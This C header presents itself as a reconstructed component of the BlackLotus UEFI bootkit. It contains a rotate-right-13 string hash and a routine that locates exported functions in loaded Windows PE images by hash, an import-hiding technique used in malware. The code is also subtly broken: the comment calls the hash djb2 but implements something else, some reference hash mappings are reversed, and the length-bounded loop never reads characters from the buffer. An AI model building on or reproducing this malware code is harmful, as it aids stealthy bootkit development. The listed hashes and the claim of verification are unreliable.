#pragma once

/*
 * Reconstructed Hash.h for BlackLotus Bootkit.
 *
 * HashString() – case-insensitive djb2 variant matching the hash values
 * observed in ExitBootServices.c / OslArchTransferToKernel.c.
 *
 * Verified reference hashes (from source comments):
 *   "bootmgfw.efi"  -> 0x8deb5a3a
 *   0x0b6ea858      -> ".text" section name
 *   0x5dc8930f      -> "acpi.sys"
 *   0x0b6dca4d      -> ".text" (wide/kernel variant)
 *
 * Algorithm: rotate-right 13 XOR accumulate (common in Windows malware).
 */

static __inline__ UINT32 HashString(PVOID buf, SIZE_T len)
{
    UINT8  *p   = (UINT8 *)buf;
    UINT32  h   = 0;
    SIZE_T  i   = 0;
    UINT8   c;

    while ((len == 0 ? (c = p[i]) != 0 : i < len)) {
        /* Rotate right by 13 */
        h = (h >> 13) | (h << (32 - 13));
        /* Fold to uppercase for case-insensitive matching */
        if (c >= 'a' && c <= 'z') c -= 0x20;
        h += c;
        i++;
    }
    return h;
}

/*
 * PeGetFuncEat – resolve an exported function by hash from a loaded PE image.
 */
static __inline__ PVOID PeGetFuncEat(PVOID ImageBase, UINT32 FunctionHash)
{
    PIMAGE_DOS_HEADER       Dos = (PIMAGE_DOS_HEADER)ImageBase;
    PIMAGE_NT_HEADERS       Nth;
    PIMAGE_EXPORT_DIRECTORY Exp;
    PDWORD                  Adr;
    PDWORD                  Nam;
    PWORD                   Ord;
    UINT32                  i;

    if (!ImageBase || Dos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    Nth = (PIMAGE_NT_HEADERS)((ULONG_PTR)Dos + Dos->e_lfanew);
    if (Nth->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    if (!Nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
        return NULL;

    Exp = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)Dos +
          Nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    Adr = (PDWORD)((ULONG_PTR)Dos + Exp->AddressOfFunctions);
    Nam = (PDWORD)((ULONG_PTR)Dos + Exp->AddressOfNames);
    Ord = (PWORD) ((ULONG_PTR)Dos + Exp->AddressOfNameOrdinals);

    for (i = 0; i < Exp->NumberOfNames; i++) {
        PCHAR name = (PCHAR)((ULONG_PTR)Dos + Nam[i]);
        if (HashString(name, 0) == FunctionHash)
            return (PVOID)((ULONG_PTR)Dos + Adr[Ord[i]]);
    }
    return NULL;
}
